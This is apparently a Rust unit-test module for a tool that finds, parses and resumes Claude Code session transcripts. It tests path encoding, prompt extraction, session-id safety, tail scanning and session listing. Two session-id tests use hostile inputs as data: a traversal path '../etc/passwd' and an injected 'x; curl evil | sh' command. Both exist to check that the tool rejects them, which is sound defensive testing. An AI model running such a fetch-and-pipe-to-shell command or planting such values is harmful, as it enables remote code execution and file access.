        assert_eq!(
            encode_project_path("/Users/alice/Maestro Projects/app"),
            "-Users-alice-Maestro-Projects-app"
        );
    }

    #[test]
    fn encodes_double_space_as_double_dash() {
        assert_eq!(
            encode_project_path("/Users/alice/Boilerplates - Starters"),
            "-Users-alice-Boilerplates---Starters"
        );
    }

    #[test]
    fn encode_preserves_dashes_but_maps_underscores_to_dashes() {
        assert_eq!(encode_project_path("/a-b_c/d_e-f"), "-a-b-c-d-e-f");
    }

    #[test]
    fn encode_maps_underscore_in_real_world_path() {
        // Regression (issue #86): Claude Code's own encoder maps `_` to `-`
        // just like every other special char. Keeping `_` produced a directory
        // name (`C--git-Dreadnought_Father_Folder`) that never exists on disk,
        // so sessions/memories for any underscore path were invisible.
        assert_eq!(
            encode_project_path(r"C:\git\Dreadnought_Father_Folder"),
            "C--git-Dreadnought-Father-Folder"
        );
    }

    // ---- canonical_project_path ------------------------------------------

    #[test]
    fn canonical_path_encodes_to_the_directory_claude_actually_uses() {
        // Regression: on Windows fs::canonicalize returns `\\?\C:\...`, which
        // encoded to `----C--...` and made every lookup miss. The encoded form
        // must never start with the four dashes that prefix produces.
        let tmp = tempfile::tempdir().unwrap();
        let raw = tmp.path().to_string_lossy().into_owned();
        let encoded = encode_project_path(&canonical_project_path(&raw));
        assert!(
            !encoded.starts_with("----"),
            "verbatim prefix leaked into encoded dir: {encoded}"
        );
        assert!(
            project_path_to_claude_dir(&canonical_project_path(&raw)).is_some(),
            "expected a resolvable claude dir"
        );
    }

    #[test]
    fn canonical_path_falls_back_to_input_when_missing() {
        // A path that cannot be canonicalized is passed through unchanged so
        // lookups still target a deterministic directory.
        let missing = "/definitely/not/a/real/path-xyz";
        assert_eq!(canonical_project_path(missing), missing);
    }

    // ---- path_is_within (host-OS independent) -----------------------------

    #[test]
    fn path_is_within_accepts_both_path_spellings() {
        // CI runs Linux, developer machines run Windows; the recorded cwd keeps
        // whatever spelling wrote it, so both must work everywhere.
        assert!(path_is_within(r"C:\git\maestro\src", r"C:\git\maestro"));
        assert!(path_is_within("C:/git/maestro/src", r"C:\git\maestro"));
        assert!(path_is_within("/home/u/repo/src", "/home/u/repo"));
        assert!(path_is_within("/home/u/repo", "/home/u/repo/"));
    }

    #[test]
    fn path_is_within_rejects_dash_prefixed_siblings() {
        // `maestro-old` shares the encoded prefix of `maestro` but is a
        // different project.
        assert!(!path_is_within(r"C:\git\maestro-old", r"C:\git\maestro"));
        assert!(!path_is_within("/home/u/repo-old", "/home/u/repo"));
        assert!(!path_is_within("/home/u/other", "/home/u/repo"));
    }

    #[test]
    fn path_is_within_is_case_insensitive() {
        assert!(path_is_within(r"c:\GIT\Maestro\src", r"C:\git\maestro"));
    }

    // ---- extract_prompt_text ---------------------------------------------

    #[test]
    fn extract_returns_plain_text_as_is() {
        assert_eq!(extract_prompt_text("hello world"), "hello world");
    }

    #[test]
    fn extract_prefers_command_args() {
        let content = "<command-name>/review-pr</command-name><command-args>222</command-args>";
        assert_eq!(extract_prompt_text(content), "222");
    }

    #[test]
    fn extract_falls_back_to_command_name_when_args_empty() {
        let content = "<command-name>/review-pr</command-name><command-args></command-args>";
        assert_eq!(extract_prompt_text(content), "/review-pr");
    }

    #[test]
    fn extract_strips_generic_xml_tags_preserving_inner_text() {
        // The stripper is intentionally naive: it removes `<...>` but keeps
        // whatever was between the tags.
        let content = "<ctx>irrelevant</ctx>real prompt";
        assert_eq!(extract_prompt_text(content), "irrelevantreal prompt");
    }

    // ---- is_system_message -----------------------------------------------

    #[test]
    fn detects_local_command_caveat_as_system() {
        assert!(is_system_message(
            "<local-command-caveat>skip me</local-command-caveat>"
        ));
    }

    #[test]
    fn detects_bash_stdout_as_system() {
        assert!(is_system_message("<bash-stdout>output</bash-stdout>"));
    }

    #[test]
    fn plain_text_is_not_system() {
        assert!(!is_system_message("hello"));
    }

    // ---- truncate_chars (the UTF-8 panic fix) ----------------------------

    #[test]
    fn truncate_shorter_than_max_is_unchanged() {
        assert_eq!(truncate_chars("short", 200), "short");
    }

    #[test]
    fn truncate_on_ascii_appends_ellipsis() {
        let s = "a".repeat(250);
        let out = truncate_chars(&s, 200);
        assert_eq!(out.chars().count(), 203); // 200 + "..."
        assert!(out.ends_with("..."));
    }

    #[test]
    fn truncate_handles_multibyte_without_panic() {
        // "🦀" is 4 bytes; byte 200 falls mid-character.
        // The previous `&s[..200]` would panic. This must not.
        let long = "🦀".repeat(300);
        let out = truncate_chars(&long, 200);
        assert!(out.ends_with("..."));
        // 200 crabs + 3 dots
        assert_eq!(out.chars().count(), 203);
    }

    // ---- is_safe_session_id ----------------------------------------------

    #[test]
    fn safe_uuid_is_accepted() {
        assert!(is_safe_session_id("01234567-89ab-cdef-0123-456789abcdef"));
    }

    #[test]
    fn traversal_and_separators_rejected() {
        assert!(!is_safe_session_id(""));
        assert!(!is_safe_session_id("../etc/passwd"));
        assert!(!is_safe_session_id("foo/bar"));
        assert!(!is_safe_session_id("foo\\bar"));
        assert!(!is_safe_session_id(".."));
    }

    #[test]
    fn non_hex_chars_rejected() {
        assert!(!is_safe_session_id("not-a-real-uuid-zzz"));
    }

    // ---- parse_session_file ----------------------------------------------

    #[test]
    fn parse_reads_basic_session() {
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("abc.jsonl");
        let jsonl = r#"{"sessionId":"abc","gitBranch":"main","timestamp":"2024-01-01T00:00:00Z","type":"user","message":{"content":"hello"}}"#;
        fs::write(&path, jsonl).unwrap();
        let info = parse_session_file(&path).expect("parsed");
        assert_eq!(info.session_id, "abc");
        assert_eq!(info.first_prompt.as_deref(), Some("hello"));
        assert_eq!(info.git_branch.as_deref(), Some("main"));
    }

    #[test]
    fn parse_skips_system_messages_and_uses_next_user_line() {
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("abc.jsonl");
        let jsonl = "\
{\"sessionId\":\"abc\",\"type\":\"user\",\"message\":{\"content\":\"<local-command-caveat>skip me</local-command-caveat>\"}}\n\
{\"sessionId\":\"abc\",\"type\":\"user\",\"message\":{\"content\":\"real prompt\"}}\n";
        fs::write(&path, jsonl).unwrap();
        let info = parse_session_file(&path).expect("parsed");
        assert_eq!(info.first_prompt.as_deref(), Some("real prompt"));
    }

    #[test]
    fn parse_truncates_long_unicode_prompt_without_panic() {
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("abc.jsonl");
        // 300 crab emojis => far beyond 200 chars and deliberately multibyte.
        let long = "🦀".repeat(300);
        let jsonl =
            format!(r#"{{"sessionId":"abc","type":"user","message":{{"content":"{long}"}}}}"#);
        fs::write(&path, &jsonl).unwrap();
        let info = parse_session_file(&path).expect("parsed");
        let prompt = info.first_prompt.expect("prompt captured");
        assert!(prompt.ends_with("..."));
    }

    #[test]
    fn parse_returns_none_without_any_usable_session_id() {
        // No sessionId in the file AND a file name that is not id-shaped:
        // nothing safe to resume with, so the caller counts it as unreadable.
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("not-a-real-uuid-zzz.jsonl");
        fs::write(&path, r#"{"type":"user","message":{"content":"hi"}}"#).unwrap();
        assert!(parse_session_file(&path).is_none());
    }

    #[test]
    fn parse_falls_back_to_the_file_name_for_the_session_id() {
        // Claude names each transcript `<session-id>.jsonl`.
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp
            .path()
            .join("01234567-89ab-cdef-0123-456789abcdef.jsonl");
        fs::write(&path, r#"{"type":"user","message":{"content":"hi"}}"#).unwrap();
        let info = parse_session_file(&path).expect("parsed");
        assert_eq!(info.session_id, "01234567-89ab-cdef-0123-456789abcdef");
    }

    #[test]
    fn parse_finds_a_session_id_far_past_the_old_80_line_window() {
        // Regression: MAX_LINES_SCANNED was 80 and a late sessionId made the
        // whole transcript disappear. The file name is not id-shaped here, so
        // only the in-file id can rescue it.
        let tmp = tempfile::tempdir().unwrap();
        let mut lines: Vec<String> = (0..200)
            .map(|i| format!(r#"{{"type":"progress","seq":{i}}}"#))
            .collect();
        lines.push(user_line("01234567-89ab-cdef-0123-456789abcdef", "late id"));
        let path = write_transcript(tmp.path(), "transcript-that-is-not-a-uuid.jsonl", &lines);
        let info = parse_session_file(&path).expect("parsed");
        assert_eq!(info.session_id, "01234567-89ab-cdef-0123-456789abcdef");
        assert_eq!(info.first_prompt.as_deref(), Some("late id"));
    }

    #[test]
    fn parse_rejects_an_unsafe_in_file_session_id_without_using_the_file_name() {
        // The guard must not be bypassable by naming the file after a valid
        // UUID while the transcript claims a hostile id.
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp
            .path()
            .join("01234567-89ab-cdef-0123-456789abcdef.jsonl");
        fs::write(
            &path,
            r#"{"sessionId":"x; curl evil | sh","type":"user","message":{"content":"hi"}}"#,
        )
        .unwrap();
        assert!(parse_session_file(&path).is_none());
    }

    #[test]
    fn parse_keeps_cwd_when_the_directory_still_exists() {
        // The resume launch runs in this directory, so it must survive parsing
        // and the session must be marked resumable.
        let tmp = tempfile::tempdir().unwrap();
        let dir = tmp.path().to_string_lossy().replace('\\', "\\\\");
        let path = tmp.path().join("abc.jsonl");
        let jsonl = format!(
            r#"{{"sessionId":"abc","cwd":"{dir}","type":"user","message":{{"content":"hi"}}}}"#
        );
        fs::write(&path, &jsonl).unwrap();
        let info = parse_session_file(&path).expect("parsed");
        let expected = tmp.path().to_string_lossy().into_owned();
        assert_eq!(info.cwd, Some(expected));
        assert!(info.cwd_exists);
        assert!(info.resumable);
        assert_eq!(info.resume_blocked_reason, None);
    }

    #[test]
    fn parse_marks_gone_directory_not_resumable_but_keeps_cwd() {
        // Deleted worktree: spawning a shell there would fail, so the session
        // must be visibly non-resumable — but the recorded cwd survives so the
        // UI can still say where the conversation ran and warn. Blanking it
        // silently retargeted the launch to the project path.
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("abc.jsonl");
        let jsonl = r#"{"sessionId":"abc","cwd":"/gone/worktree-xyz","type":"user","message":{"content":"hi"}}"#;
        fs::write(&path, jsonl).unwrap();
        let info = parse_session_file(&path).expect("parsed");
        assert_eq!(info.cwd.as_deref(), Some("/gone/worktree-xyz"));
        assert!(!info.cwd_exists);
        assert!(!info.resumable);
        assert!(
            info.resume_blocked_reason
                .as_deref()
                .is_some_and(|r| r.contains("directory")),
            "reason must explain the missing directory: {:?}",
            info.resume_blocked_reason
        );
    }

    #[test]
    fn parse_without_recorded_cwd_is_not_resumable_with_reason() {
        // No cwd in the transcript means we cannot know where `claude --resume`
        // would find the session, so it must not be offered as resumable.
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("abc.jsonl");
        fs::write(
            &path,
            r#"{"sessionId":"abc","type":"user","message":{"content":"hi"}}"#,
        )
        .unwrap();
        let info = parse_session_file(&path).expect("parsed");
        assert_eq!(info.cwd, None);
        assert!(!info.resumable);
        assert!(
            info.resume_blocked_reason
                .as_deref()
                .is_some_and(|r| r.contains("recorded")),
            "reason must explain the missing record: {:?}",
            info.resume_blocked_reason
        );
    }

    // ---- summary / last-prompt (issue #104: legible history entries) ------

    #[test]
    fn parse_picks_up_summary_entry_as_title() {
        // `{"type":"summary"}` lines sit at the top of a transcript when Claude
        // generated a title. (None exist on this machine's real transcripts —
        // shape taken from Claude Code documentation of the entry.)
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("abc.jsonl");
        let jsonl = "\
{\"type\":\"summary\",\"summary\":\"Fixing the login flow\",\"leafUuid\":\"00000000-0000-0000-0000-000000000000\"}\n\
{\"sessionId\":\"abc\",\"type\":\"user\",\"message\":{\"content\":\"hello\"}}\n";
        fs::write(&path, jsonl).unwrap();
        let info = parse_session_file(&path).expect("parsed");
        assert_eq!(info.summary.as_deref(), Some("Fixing the login flow"));
        assert_eq!(info.first_prompt.as_deref(), Some("hello"));
    }

    #[test]
    fn parse_without_summary_entry_leaves_only_first_prompt() {
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("abc.jsonl");
        let jsonl = r#"{"sessionId":"abc","type":"user","message":{"content":"hello"}}"#;
        fs::write(&path, jsonl).unwrap();
        let info = parse_session_file(&path).expect("parsed");
        assert_eq!(info.summary, None);
        assert_eq!(info.first_prompt.as_deref(), Some("hello"));
    }

    #[test]
    fn parse_takes_newest_last_prompt_entry() {
        // Claude Code appends a `last-prompt` line as turns complete; the
        // newest one (nearest EOF) is where the conversation left off.
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("abc.jsonl");
        let jsonl = "\
{\"sessionId\":\"abc\",\"type\":\"user\",\"message\":{\"content\":\"first ask\"}}\n\
{\"type\":\"last-prompt\",\"lastPrompt\":\"first ask\",\"leafUuid\":\"a\",\"sessionId\":\"abc\"}\n\
{\"type\":\"last-prompt\",\"lastPrompt\":\"latest ask\",\"leafUuid\":\"b\",\"sessionId\":\"abc\"}\n";
        fs::write(&path, jsonl).unwrap();
        let info = parse_session_file(&path).expect("parsed");
        assert_eq!(info.last_prompt.as_deref(), Some("latest ask"));
        assert_eq!(info.first_prompt.as_deref(), Some("first ask"));
    }

    #[test]
    fn parse_ignores_last_prompt_stamped_with_another_session_id() {
        // Resumed conversations copy entries across files; a foreign session's
        // prompt must not label this one.
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("abc.jsonl");
        let jsonl = "\
{\"sessionId\":\"abc\",\"type\":\"user\",\"message\":{\"content\":\"mine\"}}\n\
{\"type\":\"last-prompt\",\"lastPrompt\":\"foreign\",\"leafUuid\":\"a\",\"sessionId\":\"def\"}\n";
        fs::write(&path, jsonl).unwrap();
        let info = parse_session_file(&path).expect("parsed");
        assert_eq!(info.last_prompt, None);
    }

    #[test]
    fn tail_scan_finds_last_prompt_past_the_head_scan_window() {
        // A transcript larger than the tail budget, with the last-prompt line
        // far beyond MAX_LINES_SCANNED and huge filler lines in between: the
        // bounded tail read must still find it (and drop the partial first
        // line of the tail window without choking).
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("abc.jsonl");
        // Enough filler to exceed the (256 KB) tail budget.
        let filler_payload = "x".repeat(500);
        let mut jsonl = String::from(
            "{\"sessionId\":\"abc\",\"type\":\"user\",\"message\":{\"content\":\"start\"}}\n",
        );
        for _ in 0..600 {
            jsonl.push_str(&format!(
                "{{\"type\":\"assistant\",\"sessionId\":\"abc\",\"payload\":\"{filler_payload}\"}}\n"
            ));
        }
        jsonl.push_str(
            "{\"type\":\"last-prompt\",\"lastPrompt\":\"the closing ask\",\"leafUuid\":\"z\",\"sessionId\":\"abc\"}\n",
        );
        assert!(
            jsonl.len() as u64 > TAIL_SCAN_BYTES,
            "fixture must exceed the tail budget"
        );
        fs::write(&path, &jsonl).unwrap();
        let info = parse_session_file(&path).expect("parsed");
        assert_eq!(info.last_prompt.as_deref(), Some("the closing ask"));
    }

    #[test]
    fn tail_scan_takes_the_own_last_prompt_of_a_resumed_transcript() {
        // Resumed conversations START with history copied from the ORIGINAL
        // session — head entries (copied last-prompts included) are stamped
        // with the old id, while the file's own entries carry the id the file
        // is named after. Keying the foreign filter on the head sessionId
        // rejected the file's own newest last-prompt; the filename stem is
        // the transcript's authoritative identity.
        let tmp = tempfile::tempdir().unwrap();
        let old_id = "aaaaaaaa-0000-0000-0000-000000000001";
        let new_id = "bbbbbbbb-0000-0000-0000-000000000002";
        let path = tmp.path().join(format!("{new_id}.jsonl"));
        let jsonl = format!(
            "{{\"sessionId\":\"{old_id}\",\"type\":\"user\",\"message\":{{\"content\":\"copied history\"}}}}\n\
             {{\"type\":\"last-prompt\",\"lastPrompt\":\"copied ask\",\"leafUuid\":\"a\",\"sessionId\":\"{old_id}\"}}\n\
             {{\"type\":\"last-prompt\",\"lastPrompt\":\"the resumed ask\",\"leafUuid\":\"b\",\"sessionId\":\"{new_id}\"}}\n"
        );
        fs::write(&path, &jsonl).unwrap();
        let info = parse_session_file(&path).expect("parsed");
        assert_eq!(info.last_prompt.as_deref(), Some("the resumed ask"));
    }

    #[test]
    fn tail_scan_keeps_a_complete_first_window_line_on_the_newline_boundary() {
        // When `len - TAIL_SCAN_BYTES` lands exactly on a line START (the
        // byte before it is '\n'), the window's first line is COMPLETE and
        // must be scanned — it used to be dropped unconditionally. The only
        // last-prompt (and the only timestamp) sit exactly on that boundary.
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("abc.jsonl");
        let head =
            "{\"sessionId\":\"abc\",\"type\":\"user\",\"message\":{\"content\":\"start\"}}\n";
        let boundary = "{\"type\":\"last-prompt\",\"lastPrompt\":\"the boundary ask\",\"leafUuid\":\"z\",\"sessionId\":\"abc\",\"timestamp\":\"2021-05-05T05:05:05.000Z\"}\n";
        // One filler line padded so the boundary line's first byte lands
        // exactly at `len - TAIL_SCAN_BYTES`.
        let skeleton = "{\"type\":\"progress\",\"sessionId\":\"abc\",\"payload\":\"\"}\n";
        let padding = TAIL_SCAN_BYTES as usize - boundary.len() - skeleton.len();
        let filler = format!(
            "{{\"type\":\"progress\",\"sessionId\":\"abc\",\"payload\":\"{}\"}}\n",
            "x".repeat(padding)
        );
        let jsonl = format!("{head}{boundary}{filler}");
        assert_eq!(jsonl.len() - head.len(), TAIL_SCAN_BYTES as usize);
        fs::write(&path, &jsonl).unwrap();
        let info = parse_session_file(&path).expect("parsed");
        // scan_tail_for_recent_entries kept the boundary line…
        assert_eq!(info.last_prompt.as_deref(), Some("the boundary ask"));
        // …and so did scan_tail (this timestamp exists nowhere else — the
        // old code fell back to the file's mtime).
        assert_eq!(info.last_active, "2021-05-05T05:05:05.000Z");
    }

    #[test]
    fn parse_handles_content_array_form() {
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("abc.jsonl");
        let jsonl = r#"{"sessionId":"abc","type":"user","message":{"content":[{"type":"text","text":"array form"}]}}"#;
        fs::write(&path, jsonl).unwrap();
        let info = parse_session_file(&path).expect("parsed");
        assert_eq!(info.first_prompt.as_deref(), Some("array form"));
    }

    #[test]
    fn parse_counts_entries_and_summarises_the_last_activity() {
        let tmp = tempfile::tempdir().unwrap();
        let lines = vec![
            user_line("abc", "opening line"),
            r#"{"sessionId":"abc","type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash"}]}}"#.to_string(),
            r#"{"sessionId":"abc","type":"user","message":{"content":[{"type":"tool_result","content":"out"}]}}"#.to_string(),
            r#"{"sessionId":"abc","type":"assistant","message":{"content":[{"type":"text","text":"shipped the fix"}]}}"#.to_string(),
            r#"{"sessionId":"abc","type":"system","subtype":"turn_duration"}"#.to_string(),
        ];
        let path = write_transcript(tmp.path(), "abc.jsonl", &lines);
        let info = parse_session_file(&path).expect("parsed");
        assert_eq!(info.message_count, 5);
        assert_eq!(info.first_prompt.as_deref(), Some("opening line"));
        // Tool-only entries carry no readable text, so the walk continues back.
        assert_eq!(info.last_activity.as_deref(), Some("shipped the fix"));
    }

    #[test]
    fn last_active_uses_the_last_message_not_the_file_mtime() {
        // Real regression: transcripts get touched long after the conversation
        // ends (one file on disk drifted ~16h), which floated stale sessions to
        // the top of the History list.
        let tmp = tempfile::tempdir().unwrap();
        let lines = vec![
            r#"{"sessionId":"abc","timestamp":"2020-01-01T00:00:00.000Z","type":"user","message":{"content":"hi"}}"#.to_string(),
            r#"{"sessionId":"abc","timestamp":"2020-01-01T01:02:03.500Z","type":"assistant","message":{"content":[{"type":"text","text":"done"}]}}"#.to_string(),
        ];
        let path = write_transcript(tmp.path(), "abc.jsonl", &lines);
        // mtime is "now" — years after the conversation.
        let info = parse_session_file(&path).expect("parsed");
        assert_eq!(info.last_active, "2020-01-01T01:02:03.500Z");
    }

    #[test]
    fn last_active_falls_back_to_mtime_without_timestamps() {
        let tmp = tempfile::tempdir().unwrap();
        let lines = vec![user_line("abc", "no timestamps here")];
        let path = write_transcript(tmp.path(), "abc.jsonl", &lines);
        let info = parse_session_file(&path).expect("parsed");
        // No message timestamp -> mtime, which is recent, not the epoch.
        assert!(
            info.last_active > "2020-01-01T00:00:00.000Z".to_string(),
            "expected an mtime-derived timestamp, got {}",
            info.last_active
        );
    }

    // ---- collect_sessions (the widened, self-reporting listing) -----------

    /// Lays out `~/.claude/projects`-shaped roots inside a tempdir.
    fn projects_root() -> tempfile::TempDir {
        tempfile::tempdir().unwrap()
    }

    fn dir_for(root: &Path, project: &str) -> PathBuf {
        root.join(encode_project_path(project))
    }

    fn transcript_with_cwd(id: &str, cwd: &str, text: &str, ts: &str) -> String {
        let cwd = cwd.replace('\\', "\\\\");
        format!(
            r#"{{"sessionId":"{id}","cwd":"{cwd}","timestamp":"{ts}","type":"user","message":{{"content":"{text}"}}}}"#
        )
    }

    #[test]
    fn listing_finds_the_projects_own_directory() {
        let root = projects_root();
        let project = "/repo";
        write_transcript(
            &dir_for(root.path(), project),
            "aaaaaaaa-0000-0000-0000-000000000001.jsonl",
            &[transcript_with_cwd(
                "aaaaaaaa-0000-0000-0000-000000000001",
                "/repo",
                "in the repo",
                "2026-01-01T00:00:00.000Z",
            )],
        );
        let listing = collect_sessions(root.path(), project, &[]);
        assert_eq!(listing.sessions.len(), 1);
        assert_eq!(listing.total_found, 1);
        assert!(!listing.truncated);
        assert_eq!(listing.unreadable, 0);
    }

    #[test]
    fn listing_reaches_subdirectories_and_deleted_inside_repo_worktrees() {
        // The whole point of the prefix scan: `/repo/sub` and a worktree that
        // used to live at `/repo/wt` both encode to `-repo-...`, and neither is
        // reachable from the project path alone.
        let root = projects_root();
        let project = "/repo";
        write_transcript(
            &dir_for(root.path(), "/repo"),
            "aaaaaaaa-0000-0000-0000-000000000001.jsonl",
            &[transcript_with_cwd(
                "aaaaaaaa-0000-0000-0000-000000000001",
                "/repo",
                "root convo",
                "2026-01-01T00:00:00.000Z",
            )],
        );
        write_transcript(
            &dir_for(root.path(), "/repo/sub"),
            "bbbbbbbb-0000-0000-0000-000000000002.jsonl",
            &[transcript_with_cwd(
                "bbbbbbbb-0000-0000-0000-000000000002",
                "/repo/sub",
                "subdir convo",
                "2026-01-02T00:00:00.000Z",
            )],
        );
        write_transcript(
            &dir_for(root.path(), "/repo/wt-gone"),
            "cccccccc-0000-0000-0000-000000000003.jsonl",
            &[transcript_with_cwd(
                "cccccccc-0000-0000-0000-000000000003",
                "/repo/wt-gone",
                "deleted worktree convo",
                "2026-01-03T00:00:00.000Z",
            )],
        );

        let listing = collect_sessions(root.path(), project, &[]);
        let prompts: Vec<&str> = listing
            .sessions
            .iter()
            .filter_map(|s| s.first_prompt.as_deref())
            .collect();
        assert_eq!(listing.total_found, 3);
        assert!(prompts.contains(&"subdir convo"), "{prompts:?}");
        assert!(prompts.contains(&"deleted worktree convo"), "{prompts:?}");
        // The deleted worktree is still named, flagged as gone, not blanked.
        let gone = listing
            .sessions
            .iter()
            .find(|s| s.first_prompt.as_deref() == Some("deleted worktree convo"))
            .unwrap();
        assert_eq!(gone.cwd.as_deref(), Some("/repo/wt-gone"));
        assert!(!gone.cwd_exists);
        // Newest first.
        assert_eq!(prompts[0], "deleted worktree convo");
    }

    #[test]
    fn listing_excludes_a_sibling_project_that_shares_the_encoded_prefix() {
        // `/repo-old` encodes to `-repo-old`, which starts with `-repo-`.
        // Directory names cannot tell the two apart; the recorded cwd can.
        let root = projects_root();
        write_transcript(
            &dir_for(root.path(), "/repo-old"),
            "dddddddd-0000-0000-0000-000000000004.jsonl",
            &[transcript_with_cwd(
                "dddddddd-0000-0000-0000-000000000004",
                "/repo-old",
                "different project",
                "2026-01-04T00:00:00.000Z",
            )],
        );
        let listing = collect_sessions(root.path(), "/repo", &[]);
        assert_eq!(listing.total_found, 0, "{:?}", listing.sessions);
    }

    #[test]
    fn listing_scans_caller_supplied_roots_outside_the_repo() {
        // Maestro keeps worktrees in app-data, so no prefix of the project path
        // reaches them — the caller has to hand them over.
        let root = projects_root();
        let worktree = "/appdata/worktrees/feat-x";
        write_transcript(
            &dir_for(root.path(), worktree),
            "eeeeeeee-0000-0000-0000-000000000005.jsonl",
            &[transcript_with_cwd(
                "eeeeeeee-0000-0000-0000-000000000005",
                worktree,
                "outside worktree convo",
                "2026-01-05T00:00:00.000Z",
            )],
        );

        let without = collect_sessions(root.path(), "/repo", &[]);
        assert_eq!(without.total_found, 0);

        let with = collect_sessions(root.path(), "/repo", &[worktree.to_string()]);
        assert_eq!(with.total_found, 1);
        assert_eq!(
            with.sessions[0].first_prompt.as_deref(),
            Some("outside worktree convo")
        );
    }

    #[test]
    fn listing_counts_unparseable_transcripts_instead_of_dropping_them() {
        let root = projects_root();
        let dir = dir_for(root.path(), "/repo");
        write_transcript(
            &dir,
            "ffffffff-0000-0000-0000-000000000006.jsonl",
            &[transcript_with_cwd(
                "ffffffff-0000-0000-0000-000000000006",
                "/repo",
                "good one",
                "2026-01-06T00:00:00.000Z",
            )],
        );
        // Not JSON, and a name that yields no safe session id.
        write_transcript(
            &dir,
            "garbage-notes.jsonl",
            &["not json at all".to_string()],
        );

        let listing = collect_sessions(root.path(), "/repo", &[]);
        assert_eq!(listing.sessions.len(), 1);
        assert_eq!(listing.total_found, 1);
        assert_eq!(listing.unreadable, 1);
    }

    #[test]
    fn listing_reports_truncation_rather_than_hiding_it() {
        let root = projects_root();
        let dir = dir_for(root.path(), "/repo");
        let extra = 3;
        for i in 0..(MAX_SESSIONS_RETURNED + extra) {
            let id = format!("aaaaaaaa-0000-0000-0000-{i:012}");
            write_transcript(
                &dir,
                &format!("{id}.jsonl"),
                &[transcript_with_cwd(
                    &id,
                    "/repo",
                    "convo",
                    &format!("2026-01-01T00:00:{:02}.000Z", i % 60),
                )],
            );
        }
        let listing = collect_sessions(root.path(), "/repo", &[]);
        assert_eq!(listing.sessions.len(), MAX_SESSIONS_RETURNED);
        assert_eq!(listing.total_found, MAX_SESSIONS_RETURNED + extra);
        assert!(listing.truncated);
    }

    #[test]
    fn listing_dedupes_a_conversation_resumed_in_another_directory() {
        // The same session id is written to every directory it ran from; the
        // freshest copy wins so the row is not duplicated.
        let root = projects_root();
        let id = "aaaaaaaa-1111-2222-3333-444444444444";
        write_transcript(
            &dir_for(root.path(), "/repo"),
            &format!("{id}.jsonl"),
            &[transcript_with_cwd(
                id,
                "/repo",
                "older copy",
                "2026-01-01T00:00:00.000Z",
            )],
        );
        write_transcript(
            &dir_for(root.path(), "/repo/sub"),
            &format!("{id}.jsonl"),
            &[transcript_with_cwd(
                id,
                "/repo/sub",
                "newer copy",
                "2026-02-01T00:00:00.000Z",
            )],
        );
        let listing = collect_sessions(root.path(), "/repo", &[]);
        assert_eq!(listing.total_found, 1);
        assert_eq!(
            listing.sessions[0].first_prompt.as_deref(),
            Some("newer copy")
        );
    }

    #[test]
    fn listing_is_empty_when_nothing_matches() {
        let root = projects_root();
        let listing = collect_sessions(root.path(), "/repo", &[]);
        assert!(listing.sessions.is_empty());
        assert_eq!(listing.total_found, 0);
        assert!(!listing.truncated);
        assert_eq!(listing.unreadable, 0);
    }
}
